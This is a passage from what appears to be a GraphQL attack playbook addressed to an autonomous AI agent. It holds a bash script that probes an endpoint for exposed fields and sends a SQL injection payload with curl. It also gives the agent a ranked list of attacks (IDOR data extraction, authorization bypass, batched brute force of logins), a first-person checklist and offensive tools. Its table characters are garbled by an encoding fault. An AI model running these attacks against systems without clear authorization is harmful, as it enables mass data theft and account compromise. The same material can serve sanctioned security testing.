        -d "{\"query\":\"{ me { $field } }\"}")
    
    if echo "$response" | grep -q "\"$field\""; then
        echo "[!] Sensitive field exposed: $field"
        echo "EXPOSED: $field" >> "$OUTPUT_DIR/auth_bypass_results.txt"
    fi
done

# TEST 3: SQL Injection
echo ""
echo "[TEST 3] Injection Testing"
echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"

sqli_response=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(id: \"1'\'' OR '\''1'\''='\''1\") { id } }"}' \
    --max-time 10)

if echo "$sqli_response" | grep -qi "sql\|syntax\|error"; then
    echo "[!] Potential SQL injection!"
    echo "SQLi: Error-based detection" >> "$OUTPUT_DIR/injection_results.txt"
fi

echo ""
echo "[*] Exploitation testing complete. Results in $OUTPUT_DIR"

================================================================================
ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§ 
================================================================================

ATTACK PRIORITY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Priority â”‚ Attack                    â”‚ Impact                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 1        â”‚ Alias IDOR                â”‚ Mass data extraction                â”‚
â”‚ 2        â”‚ Mutation Auth Bypass      â”‚ Unauthorized modifications          â”‚
â”‚ 3        â”‚ Field Authorization       â”‚ Sensitive data exposure             â”‚
â”‚ 4        â”‚ CrackQL Auth Attack       â”‚ Account compromise                  â”‚
â”‚ 5        â”‚ Injection                 â”‚ Backend exploitation                â”‚
â”‚ 6        â”‚ Subscription Bypass       â”‚ Real-time data leakage              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

CRITICAL CHECKS:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â–¡ Can I access other users' data via IDOR?
â–¡ Can I modify data I shouldn't (mutations)?
â–¡ Are sensitive fields exposed?
â–¡ Is auth brute-forceable via batching?
â–¡ Do injections reach the backend?
â–¡ Are subscriptions properly authorized?

================================================================================
TOOLS REFERENCE
================================================================================
- CrackQL: Auth brute-force via batching
- graphql-cop: Security scanner (40+ checks)
- InQL: Schema analysis and attack generation
- GraphQLmap: Injection and exploitation

================================================================================
SUCCESS CRITERIA
================================================================================
âœ“ IDOR tested across all queryable types
âœ“ Mutation authorization tested (own vs other resources)
âœ“ Sensitive field access tested
âœ“ Auth brute-force via batching tested
âœ“ SQL/NoSQL injection in arguments tested
âœ“ Subscription authorization tested
âœ“ All findings documented with PoC

